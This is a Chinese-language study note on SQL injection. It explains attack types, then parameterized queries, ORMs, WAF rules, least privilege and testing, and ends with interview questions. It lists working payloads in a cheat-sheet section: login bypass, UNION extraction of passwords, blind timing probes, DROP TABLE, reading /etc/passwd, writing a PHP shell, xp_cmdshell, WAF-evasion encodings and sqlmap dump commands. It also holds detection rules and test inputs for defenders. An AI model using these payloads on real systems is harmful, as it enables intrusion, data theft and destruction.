# SQL注入 (SQL Injection)

## 版权声明

> **Copyright Notice**: 本文档为个人学习笔记，内容整理自公开技术资料、OWASP指南及业界最佳实践。引用内容均已标注来源。如有侵权请联系作者移除。
>
> **License**: 本笔记采用 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) 知识共享许可协议 - 非商业性使用 - 相同方式共享。

---

## 概述

**SQL注入 (SQL Injection)** 是最危险的Web应用漏洞之一，攻击者通过在输入中嵌入恶意SQL代码，操纵数据库执行非授权操作。作为OWASP Top 10的常客，SQL注入可导致数据泄露、权限提升甚至服务器完全控制。

```
┌─────────────────────────────────────────────────────────────────┐
│                   SQL注入攻击原理                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   正常流程：                                                     │
│   用户输入: john                                                │
│   SQL: SELECT * FROM users WHERE username = 'john'              │
│                                                                 │
│   注入攻击：                                                     │
│   用户输入: ' OR '1'='1' --                                     │
│   SQL: SELECT * FROM users WHERE username = '' OR '1'='1' --'   │
│                         └─ 永真条件 ─┘                          │
│                                                                 │
│   攻击结果：返回所有用户记录，绕过认证                          │
│                                                                 │
│   ┌─────────────┐      ┌─────────────┐      ┌─────────────┐    │
│   │   攻击者    │─────▶│  应用程序   │─────▶│   数据库    │    │
│   │  注入payload│      │ 拼接SQL语句 │      │ 执行恶意SQL │    │
│   └─────────────┘      └─────────────┘      └─────────────┘    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## SQL注入类型

### Union-based SQL注入

利用UNION操作符合并恶意查询结果。

```
┌─────────────────────────────────────────────────────────────────┐
│                   Union-based 注入                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   原始查询：                                                     │
│   SELECT name, price FROM products WHERE id = [用户输入]        │
│                                                                 │
│   注入Payload：                                                  │
│   1 UNION SELECT username, password FROM users --               │
│                                                                 │
│   结果查询：                                                     │
│   SELECT name, price FROM products WHERE id = 1                 │
│   UNION                                                         │
│   SELECT username, password FROM users --                       │
│                                                                 │
│   返回：产品信息 + 用户名密码表                                  │
│                                                                 │
│   利用步骤：                                                     │
│   1. 确定列数：' ORDER BY 1,2,3 --                               │
│   2. 确定数据类型：' UNION SELECT null, 'test', null --         │
│   3. 提取数据：' UNION SELECT username, password, null FROM     │
│                users --                                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Error-based SQL注入

利用数据库错误信息获取敏感数据。

```python
# 不同数据库的错误函数
# MySQL
' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --

# PostgreSQL
' AND 1=cast((SELECT version()) AS int) --

# SQL Server
' AND 1=@@version --

# Oracle
' AND (SELECT COUNT(*) FROM all_tables) --
```

### Blind SQL注入

当没有直接输出时使用布尔或时间延迟判断。

```
┌─────────────────────────────────────────────────────────────────┐
│                   Blind SQL注入                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   布尔盲注：                                                     │
│   条件为真时页面正常，为假时页面异常                             │
│   ' AND (SELECT LENGTH(password) FROM users WHERE               │
│          username='admin')=8 --                                 │
│   逐个字符猜测：                                                 │
│   ' AND (SELECT SUBSTRING(password,1,1) FROM users              │
│          WHERE username='admin')='a' --                         │
│                                                                 │
│   时间盲注：                                                     │
│   使用延迟函数判断条件                                           │
│   # MySQL
│   ' AND IF(ASCII(SUBSTRING(password,1,1))=97, SLEEP(5), 0) --
│   
│   # PostgreSQL
│   ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE          │
│          pg_sleep(0) END) --                                    │
│   
│   # SQL Server
│   '; WAITFOR DELAY '0:0:5' --                                  │
│                                                                 │
│   工具自动化：sqlmap, SQLninja, Havij                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Stacked Queries (堆叠查询)

执行多条SQL语句。

```sql
-- 在支持多语句的数据库中（如SQL Server, PostgreSQL）
正常输入：1
注入输入：1; DROP TABLE users; --

结果：
SELECT * FROM products WHERE id = 1;
DROP TABLE users; -- '

危险操作：
- 删除数据：DROP TABLE, DELETE FROM
- 创建用户：CREATE USER attacker WITH PASSWORD 'hack'
- 提权：GRANT ALL PRIVILEGES ON *.* TO attacker
```

---

## 攻击技术详解

### 常用注入Payload

```sql
-- 绕过认证
' OR '1'='1' --
' OR 1=1 --
' OR '1'='1' /*

-- 获取数据库版本
' UNION SELECT @@version, null --
' UNION SELECT version(), null --

-- 获取表名
' UNION SELECT table_name, null FROM information_schema.tables --

-- 获取列名
' UNION SELECT column_name, null FROM information_schema.columns 
  WHERE table_name='users' --

-- 读取文件（MySQL）
' UNION SELECT LOAD_FILE('/etc/passwd'), null --

-- 写入文件（MySQL）
' INTO OUTFILE '/var/www/shell.php' --

-- 命令执行（SQL Server）
'; EXEC xp_cmdshell 'whoami' --
```

### 绕过WAF技术

```sql
-- 大小写混淆
' UnIoN SeLeCt * FrOm users --

-- 注释分隔
'/**/UNION/**/SELECT/**/*/**/FROM/**/users--

-- URL编码
%27%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20%75%73%65%72%73%20%2D%2D

-- Unicode编码
%u0027%u0020UNION SELECT * FROM users--

-- 内联注释（MySQL）
/*!50000UNION*/ /*!50000SELECT*/ * FROM users

-- 字符串拼接
' UNION SELECT * FROM users WHERE username = 'a' || 'd' || 'm' || 'i' || 'n'

-- 十六进制编码（MySQL）
0x554e494f4e2053454c454354202a2046524f4d207573657273
```

---

## 防御机制

### 参数化查询 (Parameterized Queries)

最有效的防御方法，将数据与命令分离。

```python
# ❌ 危险 - 字符串拼接
def get_user_unsafe(username, password):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)

# ✅ 安全 - Python DB-API参数化
def get_user_safe(username, password):
    query = "SELECT * FROM users WHERE username = %s AND password = %s"
    cursor.execute(query, (username, password))
    # 参数会被正确处理，特殊字符自动转义

# ✅ 安全 - 使用命名参数
def get_user_named(username, password):
    query = "SELECT * FROM users WHERE username = %(user)s AND password = %(pwd)s"
    cursor.execute(query, {'user': username, 'pwd': password})
```

### ORM使用

使用对象关系映射(ORM)框架自动处理查询安全。

```python
# SQLAlchemy示例
from sqlalchemy.orm import Session
from sqlalchemy import select

class UserRepository:
    def __init__(self, db: Session):
        self.db = db
    
    def get_by_username(self, username: str):
        """自动防止SQL注入"""
        return self.db.query(User).filter(User.username == username).first()
    
    def search_users(self, search_term: str):
        """LIKE查询也安全"""
        return self.db.query(User).filter(
            User.username.like(f'%{search_term}%')
        ).all()

# Django ORM示例
from django.contrib.auth.models import User

# 安全的查询
user = User.objects.filter(username=username).first()

# 危险的Raw SQL - 需要手动参数化
from django.db import connection
with connection.cursor() as cursor:
    cursor.execute("SELECT * FROM users WHERE username = %s", [username])
```

### Java/Node.js安全示例

```java
// Java - PreparedStatement
import java.sql.PreparedStatement;

public User getUser(String username, String password) {
    String query = "SELECT * FROM users WHERE username = ? AND password = ?";
    
    try (PreparedStatement stmt = connection.prepareStatement(query)) {
        stmt.setString(1, username);  // 自动转义
        stmt.setString(2, password);
        ResultSet rs = stmt.executeQuery();
        // ...
    }
}

// 使用JPA/Hibernate
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);
```

```javascript
// Node.js - mysql2 with prepared statements
const mysql = require('mysql2/promise');

async function getUser(username) {
    const [rows] = await connection.execute(
        'SELECT * FROM users WHERE username = ?',
        [username]  // 参数自动转义
    );
    return rows[0];
}

// Sequelize ORM
const user = await User.findOne({
    where: { username: req.body.username }
});

// 危险的Raw Query - 使用绑定参数
const [results] = await sequelize.query(
    'SELECT * FROM users WHERE username = ?',
    { bind: [req.body.username] }
);
```

---

## WAF规则配置

### ModSecurity规则

```apache
# 基本SQL注入检测规则
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
    "@rx (?i:(?:select\s*\*\s*from|(?:delete|drop|truncate)\s+table|union\s+select.*from|concat\s*\())" \
    "id:942100,\
    phase:2,\
    deny,\
    status:403,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli'"

# 检测UNION注入
SecRule ARGS "@rx (?i)\bunion\b.*\bselect\b" \
    "id:942150,\
    phase:2,\
    deny,\
    status:403,\
    msg:'SQL Injection Attack: Union-based'"

# 检测时间延迟攻击
SecRule ARGS "@rx (?i)(sleep\s*\(|benchmark\s*\(|pg_sleep\s*\(|waitfor\s+delay)" \
    "id:942160,\
    phase:2,\
    deny,\
    status:403,\
    msg:'SQL Injection Attack: Time-based'"
```

### Nginx WAF配置

```nginx
# Nginx + Lua (OpenResty)
location / {
    # SQL注入检测
    if ($query_string ~* "union.*select.*\(") {
        return 403;
    }
    
    if ($query_string ~* "concat.*\(") {
        return 403;
    }
    
    if ($query_string ~* "sleep\s*\(") {
        return 403;
    }
    
    proxy_pass http://backend;
}
```

---

## 安全编码实践

### 输入验证

```python
import re
from marshmallow import Schema, fields, validate, ValidationError

class UserSearchSchema(Schema):
    """输入验证Schema"""
    username = fields.String(
        required=True,
        validate=[
            validate.Length(min=3, max=32),
            validate.Regexp(r'^[a-zA-Z0-9_]+$')
        ]
    )
    
class SearchQuerySchema(Schema):
    """搜索查询验证"""
    q = fields.String(
        validate=validate.Length(max=100),
        load_default=''
    )
    page = fields.Integer(
        validate=validate.Range(min=1, max=1000),
        load_default=1
    )

def validate_input(data):
    """白名单验证优于黑名单"""
    schema = UserSearchSchema()
    try:
        return schema.load(data)
    except ValidationError as err:
        raise ValueError(f"Invalid input: {err.messages}")

# 严格类型检查
def get_user_by_id(user_id: int):
    """限制ID类型为整数"""
    if not isinstance(user_id, int):
        raise TypeError("user_id must be an integer")
    return db.query(User).get(user_id)
```

### 最小权限原则

```python
# 数据库连接配置
# 只读账号用于查询
READONLY_DB_URI = "mysql://readonly_user:pass@host/app_db"

# 读写账号用于修改
WRITE_DB_URI = "mysql://write_user:pass@host/app_db"

# 管理员账号用于DDL（极少使用）
ADMIN_DB_URI = "mysql://admin_user:pass@host/app_db"

class DatabaseManager:
    def __init__(self):
        self.read_pool = create_pool(READONLY_DB_URI)
        self.write_pool = create_pool(WRITE_DB_URI)
    
    def get_user(self, user_id):
        """只读操作使用只读连接"""
        with self.read_pool.connection() as conn:
            return conn.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    
    def update_user(self, user_id, data):
        """写操作使用写连接"""
        with self.write_pool.connection() as conn:
            return conn.execute(
                "UPDATE users SET name = %s WHERE id = %s",
                (data['name'], user_id)
            )
```

### 存储过程使用

```sql
-- 使用存储过程封装业务逻辑
DELIMITER //

CREATE PROCEDURE GetUserByUsername(
    IN p_username VARCHAR(50)
)
BEGIN
    SELECT id, username, email 
    FROM users 
    WHERE username = p_username;
END //

DELIMITER ;
```

```python
# Python调用存储过程
def get_user_by_procedure(username):
    cursor.callproc('GetUserByUsername', (username,))
    return cursor.fetchall()
```

---

## 检测与测试

### 静态代码分析 (SAST)

```bash
# Bandit - Python安全扫描
bandit -r ./src -f json -o bandit-report.json

# Semgrep - 多语言支持
semgrep --config=auto --config=p/owasp-top-ten .

# 自定义SQL注入检测规则
semgrep --config=.semgrep/sql-injection.yml .
```

### 动态测试 (DAST)

```bash
# sqlmap - 自动化SQL注入测试
sqlmap -u "http://target.com/search?q=test" --batch --level=3

# 测试特定参数
sqlmap -u "http://target.com/login" --data="username=test&password=test" \
       -p username --level=5 --risk=3

# 提取数据（授权测试）
sqlmap -u "http://target.com/page?id=1" --dump --batch

# 其他工具
# - Burp Suite Scanner
# - OWASP ZAP
# - Acunetix
```

### 单元测试

```python
import pytest

class TestSQLInjectionProtection:
    """SQL注入防护测试"""
    
    @pytest.mark.parametrize("malicious_input", [
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM passwords --",
        "1 AND 1=1",
        "admin'--",
        "admin' #",
        "admin'/*",
    ])
    def test_sql_injection_blocked(self, malicious_input):
        """测试恶意输入被正确处理"""
        result = get_user_safe(malicious_input)
        assert result is None  # 不返回数据
    
    def test_legitimate_input_works(self):
        """测试正常输入正常工作"""
        result = get_user_safe("john_doe")
        assert result is not None
```

---

## 面试要点

### Q1: SQL注入的原理是什么？为什么参数化查询能防御？

**答**:
- **原理**: 用户输入被直接拼接到SQL语句中，改变查询语义，执行非预期操作
- **参数化查询原理**: 
  1. SQL语句结构先被解析和编译
  2. 用户输入作为纯数据处理，不参与解析
  3. 数据库将数据和命令严格分离
  4. 特殊字符自动转义，无法改变SQL结构

### Q2: Union-based和Blind SQL注入的区别？

**答**:
| 特性 | Union-based | Blind |
|------|-------------|-------|
| 输出 | 直接显示查询结果 | 无直接输出 |
| 判断方式 | 观察返回数据 | 观察页面差异或时间延迟 |
| 效率 | 高，一次获取大量数据 | 低，逐字符猜测 |
| 复杂度 | 需要列数匹配 | 需要构造条件判断 |
| 工具 | sqlmap --technique=U | sqlmap --technique=T/B |

### Q3: ORM是否能完全防止SQL注入？

**答**:
- **默认情况下**: ORM使用参数化查询，能防止大部分SQL注入
- **例外情况**:
  1. 使用Raw SQL时未正确参数化
  2. 动态构建查询条件（如字符串拼接WHERE子句）
  3. 某些ORM的`order by`参数可能不安全
- **建议**: 即使使用ORM，也要避免直接拼接SQL

### Q4: WAF能否完全防御SQL注入？

**答**:
- **不能**，WAF是纵深防御的一层，不是根本解决方案
- **绕过方法**:
  - 编码绕过（URL, Unicode, Hex）
  - 注释混淆
  - 分块传输
  - 逻辑等价替换
- **根本防御**: 代码层使用参数化查询

### Q5: 如何检测应用是否存在SQL注入漏洞？

**答**:
1. **代码审计**: 搜索字符串拼接SQL的地方
2. **静态分析**: 使用Bandit、Semgrep等工具
3. **动态测试**: 使用sqlmap、Burp Suite
4. **模糊测试**: 向输入点发送特殊字符观察响应
5. **日志分析**: 检查是否有异常查询模式

---

## 相关概念

- [OWASP Top 10](./owasp-top-10.md) - A03注入攻击
- [常见漏洞](../common-vulnerabilities.md) - 更多漏洞类型
- [Web安全](../web-security.md) - Web安全综合
- XSS攻击 - 另一种注入攻击
- 安全编码 - 安全开发实践

---

## 参考资料

1. [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
2. [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
3. [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
4. [sqlmap Documentation](https://sqlmap.org/)
5. [DB-API 2.0 Specification](https://peps.python.org/pep-0249/)
